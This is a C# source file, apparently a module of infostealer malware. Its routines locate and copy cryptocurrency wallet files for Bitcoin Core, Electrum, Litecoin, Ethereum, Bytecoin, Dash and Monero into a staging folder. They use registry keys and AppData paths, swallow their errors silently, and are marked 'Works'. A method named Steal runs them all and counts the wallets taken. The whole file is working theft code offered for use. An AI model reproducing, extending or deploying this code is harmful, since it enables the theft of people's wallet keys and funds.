using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
//using System.Linq;
using System.Text;

namespace NoFile
{
    class Crypto
    {
        public static int count = 0;

        public static void BitcoinCore(string directorypath)  // Works
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\BitcoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
                        count++;
                    }
                    catch (Exception ex)
                    {
                        //  // //Console.WriteLine(ex.ToString());
                    }
            }
            catch (Exception ex)
            {
                // // //Console.WriteLine(ex.ToString());
            }
        }
        
        public static void Electrum(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets").GetFiles())
                {
                        Directory.CreateDirectory(directorypath + "\\Electrum\\");
                        file.CopyTo(directorypath + "\\Electrum\\" + file.Name);
                    count++;
                }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void LTC(string directorypath) // Works
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
                    try
                    {
                        //  // //Console.WriteLine(registryKey.GetValue("strDataDir").ToString());
                        Directory.CreateDirectory(directorypath + "\\LitecoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
                        count++;
                    }
                    catch (Exception ex)
                    {
                        //  // //Console.WriteLine(ex.ToString());
                    }
            }
            catch (Exception ex)
            {
                // // //Console.WriteLine(ex.ToString());
            }
        }

        public static void ETH(string directorypath) // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + "\\Ethereum\\");
                    file.CopyTo(directorypath + "\\Ethereum\\" + file.Name);
                    count++;
                }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void BCN(string directorypath) // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + "\\Bytecoin\\");
                    if (file.Extension.Equals(".wallet"))
                    {
                        file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
                        count++;
                    }
                }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void DSH(string directorypath)  // Works
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\DashCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
                        count++;
                    }
                    catch (Exception ex)
                    {
                        //  // //Console.WriteLine(ex.ToString());
                    }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void XMR(string directorypath) // Works
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Monero\\");
                        string dir = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
                        Directory.CreateDirectory(directorypath + "\\Monero\\");
                        File.Copy(dir, directorypath + "\\Monero\\" + dir.Split('\\')[dir.Split('\\').Length - 1]);
                        count++;

                    }
                    catch (Exception ex)
                    {
                         // //Console.WriteLine(ex.ToString());
                    }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void ZEC(string directorypath)
        {

        }

        public static int Steal(string cryptoDir)
        {
            Crypto.BCN(cryptoDir);
            Crypto.BitcoinCore(cryptoDir);
            Crypto.DSH(cryptoDir);
            Crypto.Electrum(cryptoDir);
            Crypto.ETH(cryptoDir);
            Crypto.LTC(cryptoDir);
            Crypto.XMR(cryptoDir);
            Crypto.ZEC(cryptoDir);
            return count;
        }

    }
}
